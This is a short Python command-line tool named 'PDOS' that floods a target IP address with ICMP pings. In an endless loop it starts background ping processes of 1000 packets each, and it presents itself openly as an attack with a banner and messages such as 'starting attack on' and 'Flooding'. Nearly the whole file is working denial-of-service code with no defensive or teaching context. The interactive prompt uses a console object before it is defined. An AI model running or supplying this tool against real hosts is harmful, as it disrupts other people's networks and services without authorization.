
from rich.console import Console
from rich import print
import subprocess
import time
import argparse

parser = argparse.ArgumentParser(description="Python dos")
parser.add_argument("-i", "--ip", help="ip address")
args = parser.parse_args()

ip = args.ip or console.input("[red]enter target ip:[/red]")


print(r"""
           [bold blue]___________________________________________________
          (           _________                              |[/bold blue][orange1]0        ==     _            ==    +         *       --[/orange1]
           [bold blue](_________________________________________________|[/bold blue][orange1]   ==   0   - 0         -  ++           --  == 0 ++ ==[/orange1]
           [bold blue]/ /  |                     | P |
          / /__/                      | D |
         / /                          | O |
        /_/                           | S |
                                      -----[/bold blue]
""")

print("[cyan][*] Starting PDOS[/cyan]")

time.sleep(3)

console = Console()


print(f"[cyan][*]starting attack on {ip}[/cyan]")

def send_ping(ip):
    print(f"[bold red][!] Flooding {ip}... Press Ctrl+C to stop.[/bold red]")
    try:
        while True:
            # Launching multiple processes in the background
            print(f"sending 1000 packets to {ip}")
            subprocess.Popen(
                ["ping", "-i", "0.2", "-c", "1000", ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(0.1) # Prevents local CPU exhaustion while spawning
    except KeyboardInterrupt:
         print("\n[yellow][*] Attack stopped by user.[/yellow]")
send_ping(ip)


                             


